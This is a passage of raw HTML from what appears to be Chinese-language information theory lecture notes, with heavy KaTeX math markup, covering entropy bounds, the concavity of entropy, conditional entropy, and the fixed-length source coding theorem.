style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><span style="top:-1.2192em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span><span style="top:2.1085em;"><span class="pstrut" style="height:3.75em;"></span><span class="mord"><span class="mord"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size4">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.207em;"><span style="top:-2.4559em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2441em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:7.4362em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>另外值得注意的是，因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mrow><mi>lim</mi><mo>⁡</mo></mrow><mrow><mi>ε</mi><mo>→</mo><mn>0</mn></mrow></msub><mi>ε</mi><mi>log</mi><mo>⁡</mo><mi>ε</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">\lim _{\varepsilon \rightarrow 0} \varepsilon \log \varepsilon=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ε</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ε</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">ε</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span> 所以小概率事件实际上对信源熵的贡献比较小。而且信源熵是<strong>严格上凸函数</strong>。</p><p>从信息量的角度，还可以发现 $$H(X)\ge H(X/Y)$$，这叫做极值性。<strong>如果 Y 可能包含了 X 的某些信息，那么信源熵就会减少</strong>，除非 Y 是确定的，或者是二者不可能同时存在。这不要求证明。</p><h1>信道编码</h1><p>信源发出的消息序列通常不能直接送 给信道传输，需要经过信源编码和信道编 码。信道编码的目的是，提高编码的效率，降低差错，压缩信源的冗余度。简单地说， 编码是一种映射，是将输入符号映射成码字。</p><p>根据编码的方式，可以分成<strong>无失真编码</strong>和<strong>限失真编码</strong>。很显然的，<strong>无失真编码的映射需要一一对应，可逆</strong>。因此无失真编码只能用在离散信源，不能用在连续信源。比如说模拟信号转化成数字信号，是无法产生无数种字符(数字)，来表示连续的值。</p><p>假设这样一个编码过程，离散信源 X 一次产生 L 个字符，也就是每次输出是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>…</mo><msub><mi>a</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">{a_1a_2\dots a_l}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span> 这样的序列，这称作 L 元。那么现在要找到一种编码方式，将原来的符号映射成另外一套符号。<strong>定长编码定理</strong>就是研究这样的编码过程，它提出了，假如编码系统使用的字符有 m 个取值(一般是 2 个，0 和 1)，每次输出 k 个符号 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>b</mi><mn>2</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>b</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">b_1,b_2,\dots,b_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，也就是定长地用 K 个字符表示一个符号 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>…</mo><msub><mi>a</mi><mi>l</mi></msub></mrow><annotation encoding="application/x-tex">{a_1a_2\dots a_l}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span>，也即</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.25em" columnalign="center" columnspacing="0em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><msub><mi>a</mi><mn>1</mn></msub><msub><mi>a</mi><mn>2</mn></msub><mo>…</mo><msub><mi>a</mi><mi>l</mi></msub><mo>→</mo><msub><mi>b</mi><msub><mi>j</mi><mn>1</mn></msub></msub><msub><mi>b</mi><msub><mi>j</mi><mn>2</mn></msub></msub><mo>…</mo><msub><mi>b</mi><msub><mi>j</mi><mi>k</mi></msub></msub></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mrow><mi mathvariant="normal">w</mi><mi mathvariant="normal">h</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">e</mi></mrow><mtext> </mtext><msub><mi>j</mi><mn>1</mn></msub><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msub><mi>j</mi><mi>k</mi></msub><mtext> </mtext><mtext> </mtext><mrow><mi mathvariant="normal">r</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">f</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi></mrow><mtext> </mtext><mrow><mi mathvariant="normal">t</mi><mi mathvariant="normal">o</mi></mrow><mtext> </mtext><mrow><mi mathvariant="normal">s</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">i</mi><mi mathvariant="normal">a</mi><mi mathvariant="normal">l</mi></mrow><mtext> </mtext><mrow><mi mathvariant="normal">n</mi><mi mathvariant="normal">u</mi><mi mathvariant="normal">m</mi><mi mathvariant="normal">b</mi><mi mathvariant="normal">e</mi><mi mathvariant="normal">r</mi><mi mathvariant="normal">s</mi></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{gather*}&amp; a_1a_2\dots a_l\rightarrow b_{j_1}b_{j_2}\dots b_{j_k}\\&amp; \mathrm{where} \ j_1,\dots ,j_k\,\,\mathrm{refer}\ \mathrm{to}\ \mathrm{serial}\ \mathrm{numbers}\end{gather*}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3em;vertical-align:-1.25em;"></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.75em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:2.84em;"></span><span class="mord"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.75em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0572em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0572em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:-0.0572em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">where</span></span><span class="mspace"> </span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0572em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0572em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathrm">refer</span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">to</span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">serial</span></span><span class="mspace"> </span><span class="mord"><span class="mord mathrm">numbers</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.25em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p>那么，根据定长编码定理，**如果要尽可能压缩信息，减少编码的长度 K，但是同时要保证无失真编码，那么一定需要满足：编码后 X 的每个符号对应的编码携带的最大信息量，大于 X 的信源熵。**下面的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ln</mi><mo>⁡</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">\ln m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mop">ln</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span> 就是编码后的最大信源熵，R 称作信息率。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>R</mi><mo>=</mo><mfrac><mi>K</mi><mi>L</mi></mfrac><mi>log</mi><mo>⁡</mo><mi>m</mi><mo>≥</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>ε</mi><mo separator="true">,</mo><mi>ε</mi><mo>&gt;</mo><mn>0</mn><mo separator="true">,</mo><mi>σ</mi><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">R=\frac{K}{L}\log m\ge H(X)+\varepsilon ,\varepsilon &gt;0,\sigma &gt;0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0463em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3603em;"><span style="top:-2.314em;"><span class="pstrut" 